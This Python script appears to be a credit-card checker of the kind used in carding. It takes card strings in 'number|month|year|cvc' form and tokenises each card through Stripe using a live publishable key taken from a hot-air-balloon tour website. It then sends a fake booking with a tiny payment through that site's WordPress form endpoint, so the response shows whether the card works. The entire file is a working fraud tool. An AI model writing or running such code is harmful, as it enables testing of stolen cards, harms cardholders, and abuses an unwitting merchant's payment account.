import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F22fc71f1a3%3B+stripe-js-v3%2F22fc71f1a3%3B+card-element&referrer=https%3A%2F%2Fmoroccoballooning.com&time_on_page=62065&client_attribution_metadata[client_session_id]=d63af174-db60-47a2-ae3c-7ee9831d2083&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51RlWxzGLfSUH3qvsQcvhezGFA6Db505CqAcm8MpEnvXsq1YY088gBoB8b4IrfZTE9Erv0slr9Jz6oBozx7747Wrf002XyAfcDr'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_gcl_au': '1.1.382083363.1775563658',
	    '_ga': 'GA1.1.2028963988.1775563660',
	    '_ga_LBBQEZMY3V': 'GS2.1.s1775563659$o1$g0$t1775563659$j60$l0$h0',
	}
	
	headers = {
	    'authority': 'moroccoballooning.com',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gcl_au=1.1.382083363.1775563658; _ga=GA1.1.2028963988.1775563660; _ga_LBBQEZMY3V=GS2.1.s1775563659$o1$g0$t1775563659$j60$l0$h0',
	    'origin': 'https://moroccoballooning.com',
	    'referer': 'https://moroccoballooning.com/classic-hot-air-balloon/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1775563721639',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=736&_fluentform_3_fluentformnonce=114e61c651&_wp_http_referer=%2Fclassic-hot-air-balloon%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser06%40gmail.com&phone=%2B14303000850&booking_date=04%2F30%2F26&adults=1&children=0&input_text=&subtotal=120&fee=3.60&custom-payment-amount=0.5&payment_method_1=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	response = requests.post(
	    'https://moroccoballooning.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
